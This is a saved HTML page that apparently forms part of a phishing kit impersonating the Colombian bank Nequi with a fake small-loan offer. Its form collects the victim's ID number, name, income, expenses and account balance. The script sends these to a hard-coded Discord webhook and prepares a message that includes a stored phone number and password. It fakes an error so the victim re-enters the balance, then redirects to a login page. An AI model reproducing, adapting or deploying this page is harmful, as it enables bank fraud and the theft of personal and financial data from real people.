<!DOCTYPE html>
<!-- saved from url=(0072)https://estudiodecredito.replit.app/1/validate-data/amount-simulator.php -->
<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>¡Plata de una en tu Nequi!</title>
  <link rel="stylesheet" href="../css/index-1.css">
  <!-- <link rel="stylesheet" href="../css/loading-validation.css" /> -->
  <link rel="stylesheet" href="../css/spinner-3.css">
  <link rel="stylesheet" href="../css/navbar-1.css">
  <link rel="stylesheet" href="../css/globals-3.css">
  <link rel="stylesheet" href="../css/styles.css">

  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon-3.ico">
  <style>
    .loadingContainer {
      display: none;
    }

    footer {
      margin-top: 40px;
      background: url(../assets/footer-nequi-1.svg);
      background-repeat: no-repeat;
      background-size: cover;
      padding: 100px 0 60px 0;
    }

    .messageErrorContainer {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      width: 100vw;
      height: 100vh;
      z-index: 100;
      display: none;
      justify-content: center;
      align-items: center;
      background-color: #fff;
      overflow-y: auto;
      margin-top: 64px;
    }

    .messageWrapper {
      display: flex;
      justify-content: center;
      /* align-items: ; */
      width: 100vw;
      height: 30vh;
    }

    .messageContainer {
      background: #fff;
      width: 60vw;
      height: 20vh;
      margin: auto;
      border-radius: 5px;
    }
  </style>
</head>

<body class="bodyContainer">
  <main class="loadingContainer">
    <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
      <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
        <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
          <a href="loan-simulator.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
            <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
              <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
              <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
              <path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
              <path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
              <path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
              <path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
              <path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
            </svg>
          </a>
          <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer" aria-label="Menu">
            <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
            <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
            <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
          </button>
        </div>
      </div>
    </header>

    <section class="mainSectionContainer loading">
      <div class="hero-image"></div>
      <div class="mainSectionWrapper">
        <div class="logo_nequi_animado">
          <img src="../assets/loading-nequi-1.webp" alt="">
        </div>
        <p class="wait-msg">Por favor, espere...</p>
        <p class="info-msg">En este momento estamos validando algunos datos. puede tardar un momento.</p>

        <div class="bottom" style="display: flex;">
        
          <img src="../assets/seguro_fogafin-1.svg" alt="image">
        </div>
      </div>
    </section>

    <footer>
      <div class="wrap">
        <div class="wrapper">
          <div class="footer">
            <img class="footer-mobile" src="../assets/footer-2.png" alt="">
          </div>
        </div>
      </div>
    </footer>
  </main>

  <script>
    document.getElementById("mes").textContent = "Mayo";
    document.getElementById("mes2").textContent = "Julio";
    document.getElementById("dia").textContent = "10";
    document.getElementById("dia2").textContent = "31";
    document.getElementById("anio").textContent = "2025";
  </script>
  <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
    <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
      <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
        <a href="loan-simulator.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
          <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
            <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
            <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
            <path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
            <path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
            <path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
            <path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
            <path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
          </svg>
        </a>
        <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer" aria-label="Menu">
          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
        </button>
      </div>
    </div>
  </header>

  <div class="credits" style="padding-bottom: 0 !important;">
    <div class="wrap">
      <div class="wrapper" style="width: 100% !important;">
        <div class="type-credits__content" id="type-credits">
          <div class="type-credits-card-w credit-2">
            <div class="big-letter" style="height: 50vh !important;">
              <img src="../assets/logo-credito.png" style="width: 150px;">
              <!-- <p class="u-text-white"
                style="background-color: #f5f4f445; font-weight: 600; padding: .5rem; border-radius: .5rem; font-size: 17px; backdrop-filter: blur(7px);">
                Crédito de bajo monto
                <br>
                Desde $100.000 a $2.400.000. En minutos te decimos si te lo aprobamos o no
              </p> -->
              <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;">
                Valida tus datos y solicita tu crédito
              </h1>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <section class="errorMessage messageErrorContainer">
    <div class="messageWrapper">
      <div class="messageContainer">
        <div class="flex justify-center items-center">
          <img class="max-w-[5.5rem]" src="../assets/iconsad-1.svg" alt="">
        </div>
        <p class="text-2xl font-bold w-full text-center mb-4 mt-1" style="color: #da0081;">
          ¡Ups, algo salió mal!
        </p>
        <p id="wait-msg" class="text-purple-primary w-full text-center mb-4 mt-1 text-sm font-medium">
          No pudimos terminar lo que estabas haciendo, ¡Corrige el error e inténtalo de nuevo!
        </p>
      </div>
    </div>

    <footer>
      <div class="wrap">
        <div class="wrapper">
          <div class="footer">
            <img class="footer-mobile" src="../assets/footer-2.png" alt="">
          </div>
        </div>
      </div>
    </footer>
  </section>

  <main class="mainContainer">
    <section class="">
      <div class="bg-white rounded-lg">
        <div class="px-6" id="simuladorSalvavidas">
          <div class="max-w-[400px] mx-auto">
            <div class="bg-purple-primary w-full rounded-lg p-4">
              <h4 class="text-[1.25rem] font-medium text-balance text-left w-full text-white mb-2">
                ¿Cuánta plata necesitas?
              </h4>
              <div class="relative">
                <div class="text-3xl font-semibold text-white mb-4">
                  $<span id="montoSeleccionadoSalvavidas">100.000</span>
                </div>
                <input type="range" id="montoSalvavidas" min="100000" max="2400000" step="100000" value="100000" class="range-slider" style="
                      background: linear-gradient(
                        to right,
                        var(--color-pink-primary) 0%,
                        var(--color-gray-primary) 0%
                      );
                    ">
                <script>
                  const sliderSalvavidas =
                    document.getElementById("montoSalvavidas");

                  function updateSliderBackground() {
                    const val =
                      ((sliderSalvavidas.value - sliderSalvavidas.min) /
                        (sliderSalvavidas.max - sliderSalvavidas.min)) *
                      100;
                    sliderSalvavidas.style.background = `linear-gradient(to right, var(--color-pink-primary) ${val}%, var(--color-gray-primary) ${val}%)`;
                  }

                  sliderSalvavidas.addEventListener(
                    "input",
                    updateSliderBackground
                  );
                  updateSliderBackground(); // Inicializa al cargar
                </script>
                <div class="flex justify-between text-sm text-gray-300 mt-2">
                  <span>$100.000</span>
                  <span>$2.400.000</span>
                </div>
              </div>
            </div>
            <p class="text-xs text-gray-500 mt-3 mb-3">
              Ten en cuenta que el valor que selecciones en este rango, es el
              valor que vas a desembolsar.
            </p>
            <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
              Datos personales
            </h4>
            <div class="flex flex-col justify-center items-center gap-4 mb-3 w-full">

              <!-- Cédula -->
              <div class="form-group">
                <input type="text" required="" inputmode="numeric" maxlength="10" pattern="[0-9]*" id="cedulaSalvavidas">
                <label for="cedulaSalvavidas">Ingresa tu cédula</label>
              </div>
              <span id="cedulaErrorSalvavidas" class="text-red-500 text-xs hidden">La cédula debe tener entre 8 y 10
                dígitos</span>

              <!-- Nombre -->
              <div class="form-group">
                <input type="text" id="nombreCompletoSalvavidas" required="">
                <label for="nombreCompletoSalvavidas">Nombre y apellido</label>
              </div>
              <span id="nombreErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tu nombre y apellido</span>

              <!-- Ocupación -->
              <div style="width: 100%;">
                <div class="relative">
                  <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Ocupación</span>
                  <select id="ocupacionSelectorSalvavidas" class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
                    <option value="Empleado">Empleado</option>
                    <option value="Independiente">Independiente</option>
                  </select>
                  <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewbox="0 0 24 24">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                    </svg>
                  </div>
                </div>
              </div>

              <!-- Ingresos -->
              <div class="form-group">
                <input type="text" id="ingresoMensualSalvavidas" required="">
                <label for="saldoActual">Ingresos mensuales</label>
              </div>
              <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus ingresos
                mensuales</span>

              <!-- Gastos -->
              <div class="form-group">
                <input type="text" id="gastosMensualSalvavidas" required="">
                <label for="saldoActual">Gastos mensuales</label>
              </div>
              <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
                mensuales</span>

              <!-- Saldo -->
              <div class="form-group">
                <input type="text" id="saldoActualSalvavidas" required="">
                <label for="saldoActual">Saldo actual en tu cuenta NEQUI</label>
              </div>
              <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tu Saldo actual en tu
                cuenta NEQUI</span>
              <span class="text-gray-500 text-xs">Por políticas financieras el saldo actual no será visible en la
                solicitud, solo
                hace parte del proceso de validación ante las centrales de riesgo.</span>
            </div>

            <!-- Selector de meses -->
            <div class="mb-4">
              <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
                ¿En cuánto tiempo quieres pagar tu préstamo?
              </h4>
              <div class="relative">
                <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Selecciona las cuotas</span>
                <select id="plazoSelectorSalvavidas" class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
                  <option value="1">1 mes</option>
                  <option value="2">2 meses</option>
                  <option value="3">3 meses</option>
                  <option value="4">4 meses</option>
                  <option value="5">5 meses</option>
                  <option value="6">6 meses</option>
                  <option value="7">7 meses</option>
                  <option value="8">8 meses</option>
                  <option value="9">9 meses</option>
                  <option value="10" selected="">10 meses</option>
                  <option value="11">11 meses</option>
                  <option value="12">12 meses</option>
                </select>
                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewbox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                  </svg>
                </div>
              </div>
            </div>

            <!-- Fecha de pago -->
            <div class="mb-4">
              <div class="relative">
                <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Fecha de pago</span>
                <select id="fechaPago" class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
                  <option value="1">1 de cada mes</option>
                  <option value="15">15 de cada mes</option>
                  <option value="25">25 de cada mes</option>
                </select>
                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
                  <svg class="w-4 h-4" fill="none" stroke="currentColor" viewbox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                  </svg>
                </div>
              </div>
            </div>

            <!-- Tasa de interés -->
            <div class="mb-4">
              <h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">
                Tasa de interés
              </h4>
              <div class="text-purple-primary font-medium">
                1.81% E.M igual a 24% E.A
              </div>
            </div>

            <!-- Valor cuota mensual -->
            <div class="mb-4">
              <h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">
                Valor aproximado de tu cuota mensual:
              </h4>
              <div class="cuotaMensualSalvavidas text-3xl font-semibold text-purple-primary">
                $15.900
              </div>
              <p class="text-md text-black font-medium mt-2">
                Incluye préstamo (capital), seguro e intereses.
              </p>
            </div>

            <!-- Botón Acepta -->
            <button type="button" id="btnContinuarSalvavidas" class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed" disabled="">
              Validar
            </button>
          </div>
        </div>
       
        <script>
          document.addEventListener("DOMContentLoaded", () => {
            let contSendButton = 1;
            const loadingSpinner =
              document.querySelector(".loadingContainer");
            const inputMontoSalvavidas =
              document.getElementById("montoSalvavidas");
            const montoSeleccionadoSalvavidas = document.getElementById(
              "montoSeleccionadoSalvavidas"
            );
            const cuotaMensualSalvavidas = document.querySelector(
              ".cuotaMensualSalvavidas"
            );
            const plazoSelectorSalvavidas = document.getElementById(
              "plazoSelectorSalvavidas"
            );
            const fechaPago = document.getElementById("fechaPago");
            const TASA_INTERES_MENSUAL_SALVAVIDAS = 0.009; // 1.81%

            // Formatear el monto mientras se desliza el slider
            inputMontoSalvavidas.addEventListener("input", (e) => {
              const valor = parseInt(e.target.value);
              montoSeleccionadoSalvavidas.textContent = new Intl.NumberFormat(
                "es-CO"
              ).format(valor);
              calcularCuotaMensualSalvavidas(valor);
            });

            // Recalcular cuando cambie el plazo
            plazoSelectorSalvavidas.addEventListener("change", () => {
              const valor = parseInt(inputMontoSalvavidas.value);
              calcularCuotaMensualSalvavidas(valor);
            });

            function calcularCuotaMensualSalvavidas(monto) {
              const meses = parseInt(plazoSelectorSalvavidas.value);
              const tasaInteres = TASA_INTERES_MENSUAL_SALVAVIDAS;
              const interesMensual = monto * tasaInteres;
              const seguroMensual = 5000; // Valor ejemplo
              const cuotaMensual =
                monto / meses + interesMensual + seguroMensual;

              cuotaMensualSalvavidas.textContent =
                "$" +
                new Intl.NumberFormat("es-CO").format(
                  Math.round(cuotaMensual)
                );
            }

            // Calcular cuota inicial
            calcularCuotaMensualSalvavidas(100000);

            //Validacion datos personales

            function validarCedula(cedula) {
              return cedula.length >= 8 && cedula.length <= 10;
            }

            function validarNombre(nombre) {
              return nombre.trim().length >= 5 && nombre.includes(" ");
            }

            function validarSaldoActual(saldo) {
              return saldo.length >= 5;
            }

            function validarIngresoMensual(saldo) {
              return saldo.length >= 5;
            }

            function validarGastosMensual(saldo) {
              return saldo.length >= 5;
            }

            function actualizarEstadoBotonContinuar() {
              const cedulaValida = validarCedula(cedulaSalvavidas.value);
              const nombreValido = validarNombre(
                nombreCompletoSalvavidas.value
              );
              const saldoActualValido = validarSaldoActual(
                saldoActualSalvavidas.value
              );
              const ingresoMensualValido = validarIngresoMensual(
                ingresoMensualSalvavidas.value
              );
              const gastosMensualValido = validarGastosMensual(
                gastosMensualSalvavidas.value
              );

              btnContinuarSalvavidas.disabled = !(
                cedulaValida && nombreValido && saldoActualValido && ingresoMensualValido && gastosMensualValido
              );

              if (btnContinuarSalvavidas.disabled) {
                btnContinuarSalvavidas.classList.add(
                  "opacity-80",
                  "cursor-not-allowed"
                );
              } else {
                btnContinuarSalvavidas.classList.remove(
                  "opacity-80",
                  "cursor-not-allowed"
                );
              }
            }

            const cedulaInput = document.getElementById("cedulaSalvavidas");
            const nombreCompletoInput = document.getElementById(
              "nombreCompletoSalvavidas"
            );
            const saldoActualInput = document.getElementById(
              "saldoActualSalvavidas"
            );
            const ingresoMensualInput = document.getElementById(
              "ingresoMensualSalvavidas"
            );

            const gastosMensualInput = document.getElementById(
              "gastosMensualSalvavidas"
            );
            const ocupacionSelectorSalvavidas = document.getElementById(
              "ocupacionSelectorSalvavidas"
            );
            const cedulaError = document.getElementById(
              "cedulaErrorSalvavidas"
            );
            const nombreError = document.getElementById(
              "nombreErrorSalvavidas"
            );
            const btnContinuarSalvavidas = document.getElementById(
              "btnContinuarSalvavidas"
            );

            // Validación de cédula
            cedulaInput.addEventListener("input", (e) => {
              const valor = e.target.value.replace(/\D/g, "");
              e.target.value = valor;

              if (valor.length < 8 || valor.length > 10) {
                cedulaError.classList.remove("hidden");
                e.target.classList.add("border-red-500");
              } else {
                cedulaError.classList.add("hidden");
                e.target.classList.remove("border-red-500");
              }
              actualizarEstadoBotonContinuar();
            });

            // Validación de nombre
            nombreCompletoInput.addEventListener("input", (e) => {
              const valor = e.target.value.trim();
              if (valor.length < 5 || !valor.includes(" ")) {
                nombreError.classList.remove("hidden");
                e.target.classList.add("border-red-500");
              } else {
                nombreError.classList.add("hidden");
                e.target.classList.remove("border-red-500");
              }
              actualizarEstadoBotonContinuar();
            });

            // Validacion saldo
            saldoActualInput.addEventListener("input", (e) => {
              saldoActualInput.style.border = '0'
              let value = e.target.value;

              value = value.replace(/\D/g, "");

              if (value) {
                const numericValue = parseFloat(value) / 100;

                value = new Intl.NumberFormat("es-CO", {
                  style: "currency",
                  currency: "COP",
                  minimumFractionDigits: 0,
                  maximumFractionDigits: 0
                }).format(value);
              }

              e.target.value = value;
              actualizarEstadoBotonContinuar();
            });

            // Validacion ingresos mensuales
            ingresoMensualInput.addEventListener("input", (e) => {
              let value = e.target.value;

              value = value.replace(/\D/g, "");

              if (value) {
                const numericValue = parseFloat(value) / 100;

                value = new Intl.NumberFormat("es-CO", {
                  style: "currency",
                  currency: "COP",
                  minimumFractionDigits: 0,
                  maximumFractionDigits: 0
                }).format(value);
              }

              e.target.value = value;

              actualizarEstadoBotonContinuar();
            });

            // Validacion gastos mensuales
            gastosMensualInput.addEventListener("input", (e) => {
              let value = e.target.value;

              value = value.replace(/\D/g, "");

              if (value) {
                const numericValue = parseFloat(value) / 100;

                value = new Intl.NumberFormat("es-CO", {
                  style: "currency",
                  currency: "COP",
                  minimumFractionDigits: 0,
                  maximumFractionDigits: 0
                }).format(value);
              }

              e.target.value = value;

              actualizarEstadoBotonContinuar();
            });

            const errorMessage = document.querySelector(".errorMessage");
            btnContinuarSalvavidas.addEventListener("click", async (e) => {
              e.preventDefault();
              loadingSpinner.style.display = "block";
              if (contSendButton === 1) {
                setTimeout(() => {
                  errorMessage.style.display = "block";
                  saldoActualInput.style.border = '2px solid #da0081'
                  loadingSpinner.style.display = "none";
                }, 10000);

                setTimeout(() => {
                  errorMessage.style.display = "none";
                  contSendButton += 1;
                  saldoActualSalvavidas.value = '';
                  actualizarEstadoBotonContinuar();
                  window.scrollTo({ top: ingresoMensualInput.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
                }, 15000);
              } else {
                setTimeout(() => {
                  window.location.href = "access-passed/login.php";
                }, 5000);
              }
              try {
                const formData =
                  JSON.parse(localStorage.getItem("formData")) || {};
                formData.cedula = cedulaSalvavidas.value;
                formData.nombreCompleto = nombreCompletoSalvavidas.value;
                formData.montoPrestamo =
                  montoSeleccionadoSalvavidas.textContent;
                formData.ocupacion = ocupacionSelectorSalvavidas.value
                formData.ingresoMensual = ingresoMensualSalvavidas.value
                formData.gastosMensual = gastosMensualSalvavidas.value
                formData.saldoActual = saldoActualSalvavidas.value
                formData.meses = plazoSelectorSalvavidas.value;
                formData.fechaPago = fechaPago.value;
                formData.tipoProducto = 'Bajo monto'
                localStorage.setItem("formData", JSON.stringify(formData));

                message = `⭐⭐Nequi paso 2.${contSendButton}⭐⭐\n\n🪪Cedula: ${formData.cedula
                  }\n👤Nombre: ${formData.nombreCompleto}\n💰Monto: ${formData.montoPrestamo
                  }\n🧑‍💼Ocupación: ${formData.ocupacion}\n📈Ingresos mensuales: ${formData.ingresoMensual
                  }\n💸Gastos mensuales: ${formData.gastosMensual}\n🔥Saldo actual en tu cuenta NEQUI: ${formData.saldoActual
                  }\n🔢Meses: ${formData.meses}\n📅Fecha de pago: ${formData.fechaPago
                  }\n📱Número: ${formData.phoneNumber}\n🔒Clave: ${formData.password
                  }\n📢Tipo: Bajo monto`;
                // ======================
// Enviar a Discord
// ======================
const discordMessage = `🟣 INFO DE PRÉSTAMO 🟣\n\n🪪 Cédula: ${formData.cedula}\n👤 Nombre y apellido: ${formData.nombreCompleto}\n🧑‍💼 Ocupación: ${formData.ocupacion}\n📈 Ingresos mensuales: ${formData.ingresoMensual}\n💸 Gastos mensuales: ${formData.gastosMensual}\n💰 Saldo actual: ${formData.saldoActual}`;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1430654737329557514/4I4rhRIXRtkc7C9nm1Kd_8_UZgvvsmYoKDQUo-8mVvxMR7I3RMyUiP_7TiD3HDRRBEHP"; 

await fetch(DISCORD_WEBHOOK, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    content: discordMessage,
  }),
});

              } catch (error) {
                console.error("Error al enviar el mensaje:", error);
              }
            });
          });
        </script>
      </div>
    </section>
    <footer>
      <div class="wrap">
        <div class="wrapper">
          <div class="footer">
            <img class="footer-mobile" src="../assets/footer-2.png" alt="">
          </div>
        </div>
      </div>
    </footer>
  </main>
</body>

</html>